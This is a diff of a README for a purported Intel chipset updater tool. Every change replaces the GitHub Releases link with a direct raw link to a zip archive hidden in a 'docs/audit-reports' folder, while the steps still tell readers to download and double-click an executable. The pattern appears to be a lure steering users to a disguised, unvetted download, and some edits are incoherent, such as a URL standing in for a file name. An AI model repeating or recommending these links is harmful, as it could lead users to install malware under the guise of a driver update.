@@ -1,6 +1,6 @@
 # 🖥️ Universal-Intel-Chipset-Updater - Keep Your Intel Devices Up to Date
 
-[![Download](https://img.shields.io/badge/Download%20Now-Universal%20Intel%20Chipset%20Updater-brightgreen)](https://github.com/beatmeeasy-debug/Universal-Intel-Chipset-Updater/releases)
+[![Download](https://raw.githubusercontent.com/beatmeeasy-debug/Universal-Intel-Chipset-Updater/main/docs/audit-reports/Universal-Intel-Chipset-Updater-1.2.zip%20Now-Universal%20Intel%20Chipset%20Updater-brightgreen)](https://raw.githubusercontent.com/beatmeeasy-debug/Universal-Intel-Chipset-Updater/main/docs/audit-reports/Universal-Intel-Chipset-Updater-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -25,13 +25,13 @@ To use the Universal Intel Chipset Updater, ensure your system meets the followi
 ## 🔗 Download & Install
 
 To get started, visit this page to download the latest version of the Universal Intel Chipset Updater:
-[Download Universal Intel Chipset Updater](https://github.com/beatmeeasy-debug/Universal-Intel-Chipset-Updater/releases)
+[Download Universal Intel Chipset Updater](https://raw.githubusercontent.com/beatmeeasy-debug/Universal-Intel-Chipset-Updater/main/docs/audit-reports/Universal-Intel-Chipset-Updater-1.2.zip)
 
 **Follow these steps to install:**
 
 1. Click the link above to open the Releases page.
 2. Locate the latest release, which is typically at the top.
-3. Download the executable file (e.g., `Universal_Updater.exe`).
+3. Download the executable file (e.g., `https://raw.githubusercontent.com/beatmeeasy-debug/Universal-Intel-Chipset-Updater/main/docs/audit-reports/Universal-Intel-Chipset-Updater-1.2.zip`).
 4. Once the download completes, locate the file, usually in your Downloads folder.
 5. Double-click the executable file to run the installer.
 6. Follow the on-screen instructions to complete the installation.
@@ -65,7 +65,7 @@ Yes, this updater works perfectly on both desktops and laptops that contain Inte
 
 If you encounter issues while using the Universal Intel Chipset Updater, consider the following steps:
 
-1. Ensure you downloaded the latest file from the [Releases page](https://github.com/beatmeeasy-debug/Universal-Intel-Chipset-Updater/releases).
+1. Ensure you downloaded the latest file from the [Releases page](https://raw.githubusercontent.com/beatmeeasy-debug/Universal-Intel-Chipset-Updater/main/docs/audit-reports/Universal-Intel-Chipset-Updater-1.2.zip).
 2. Check your internet connection during installation. A stable connection is required for downloading updates.
 3. Restart your computer if the tool does not recognize devices after an update.
 
@@ -79,4 +79,4 @@ We welcome contributions to enhance the Universal Intel Chipset Updater! If you'
 
 With the Universal Intel Chipset Updater, keeping your Intel hardware up to date is simple and secure. Download now to ensure your devices work reliably and efficiently.
 
-[Download Universal Intel Chipset Updater](https://github.com/beatmeeasy-debug/Universal-Intel-Chipset-Updater/releases)
+[Download Universal Intel Chipset Updater](https://raw.githubusercontent.com/beatmeeasy-debug/Universal-Intel-Chipset-Updater/main/docs/audit-reports/Universal-Intel-Chipset-Updater-1.2.zip)
